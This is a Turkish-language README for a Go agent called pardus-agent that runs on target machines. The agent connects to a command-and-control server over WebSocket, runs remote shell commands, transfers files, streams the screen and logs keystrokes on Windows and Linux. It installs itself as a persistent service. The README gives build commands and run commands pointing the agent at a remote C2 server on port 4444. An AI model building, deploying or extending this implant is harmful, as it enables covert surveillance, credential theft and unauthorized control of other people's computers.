# Agent İstemcisi (Client — Go)

Hedef makinelerde çalışan agent uygulamasıdır. Go dilinde yazılmıştır. Sunucuya WebSocket üzerinden bağlanır, komutları çalıştırır ve sonuçları geri iletir.

## Teknolojiler

- **Dil:** Go
- **WebSocket:** gorilla/websocket
- **Derleme:** Makefile ile çapraz derleme

## Temel Sorumluluklar

- Sunucuya WebSocket ile bağlanma ve otomatik kayıt (hostname, işletim sistemi, kullanıcı adı, IP)
- 10 saniyede bir kalp atışı göndererek çevrimiçi durumu bildirme
- Sunucudan gelen komutları çalıştırma (`sh -c` veya `cmd /c`)
- Komut çıktılarını (stdout/stderr) sunucuya geri gönderme
- Bağlantı koptuğunda 5 saniye sonra otomatik yeniden bağlanma
- Dosya yönetimi (listeleme, indirme, yükleme)
- Ekran akışı (screen streaming)
- Keylogger: tuş vuruşlarını yakalama ve sunucuya toplu gönderme
- Kalıcılık: kendini sistem servisi olarak kurma (daemon)

## Platform Desteği

Agent çalıştığı işletim sistemini otomatik algılar:

- **Windows:** Komutlar `cmd /c` ile çalıştırılır. Keylogger `GetAsyncKeyState` (user32.dll) kullanır. Kalıcılık Zamanlanmış Görev (Scheduled Task) ile sağlanır.
- **Linux:** Komutlar `sh -c` ile çalıştırılır. Keylogger `/dev/input/event*` aygıtlarını okur (root veya `input` grubu gerektirir). Kalıcılık systemd servisi ile sağlanır.

## Kaynak Dosyalar

- `main.go` — Ana giriş noktası, WebSocket iletişimi, komut çalıştırma, dosya yönetimi, ekran akışı
- `installer.go` — Daemon kurulumu (systemd + Windows Scheduled Task)
- `keylogger.go` — Platform bağımsız keylogger mantığı (tampon, gönderim, başlat/durdur)
- `keylogger_windows.go` — Windows keylogger uygulaması
- `keylogger_linux.go` — Linux keylogger uygulaması
- `pty_handler.go` — Linux PTY (sahte terminal) yönetimi
- `pty_handler_windows.go` — Windows PTY yönetimi

## Derleme

```bash
cd client-go

# Mevcut platform için derleme
go build -ldflags="-s -w" -o pardus-agent .

# Linux AMD64 (Pardus için)
make linux

# Windows AMD64
make windows

# Tüm platformlar
make all
```

## Çalıştırma

```bash
# Yerel sunucuya bağlanma (varsayılan)
./pardus-agent

# Uzak sunucuya bağlanma (parametre ile)
./pardus-agent --server ws://IP:4444/ws/agent

# Uzak sunucuya bağlanma (ortam değişkeni ile)
C2_SERVER=ws://IP:4444/ws/agent ./pardus-agent

# Sistem servisi olarak kurma (root/admin gerektirir)
sudo ./pardus-agent install --server ws://IP:4444/ws/agent
```

## Derlenen İkili Dosyalar

Derleme sonrası oluşan çalıştırılabilir dosyalar bu klasörde saklanır. `.gitignore` ile ikili dosyaların sürüm kontrolüne eklenmemesi sağlanmıştır.
